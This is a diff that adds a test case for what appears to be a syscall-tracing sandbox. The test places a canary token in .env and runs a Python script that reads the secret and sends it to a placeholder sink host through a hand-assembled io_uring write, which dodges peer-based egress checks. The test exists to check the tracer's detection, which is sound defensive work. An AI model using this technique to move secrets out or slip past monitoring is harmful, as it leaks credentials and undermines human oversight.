@@ -1,0 +1,47 @@
+# An io_uring IORING_OP_WRITE to an already-connected socket names only a
+# descriptor, never a peer. The tracer reads the pending submission at
+# io_uring_enter and must gate any operation that may reach a socket (anything
+# but the effectless poll/timeout/cancel set) as an unknown peer. Hand-rolled
+# with ctypes and mmap: no liburing, no Python 3.10+.
+#
+# Only a kernel whose ring pages ptrace can read exercises the opcode check.
+# Before 6.x (e.g. 5.15) the rings are PFN-mapped, every read of them fails
+# with EIO, and the unreadable submission is gated as an unknown peer anyway.
+name = "io-uring-socket-write"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "ur.py"
+contents = """
+import ctypes, mmap, socket, struct
+libc = ctypes.CDLL(None, use_errno=True)
+libc.syscall.restype = ctypes.c_long
+s = socket.socket()
+s.connect(("{SINK_HOST}", {SINK_PORT}))
+secret = open(".env", "rb").read()
+params = ctypes.create_string_buffer(120)
+ring = libc.syscall(425, ctypes.c_uint(4), params)
+p = params.raw
+entries = struct.unpack_from("I", p, 0)[0]
+head, tail, mask, _, _, _, array = struct.unpack_from("7I", p, 40)
+sq = mmap.mmap(ring, array + 4 * entries, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0)
+sqes = mmap.mmap(ring, 64 * entries, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0x10000000)
+buf = ctypes.create_string_buffer(secret, len(secret))
+struct.pack_into("BBHiQQII", sqes, 0, 23, 0, 0, s.fileno(), 0, ctypes.addressof(buf), len(secret), 0)
+struct.pack_into("I", sq, array, 0)
+struct.pack_into("I", sq, tail, struct.unpack_from("I", sq, tail)[0] + 1)
+libc.syscall(426, ctypes.c_uint(ring), ctypes.c_uint(1), ctypes.c_uint(1), ctypes.c_uint(1), None, ctypes.c_size_t(0))
+"""
+
+[[steps]]
+shell = 0
+run = "python3 ur.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
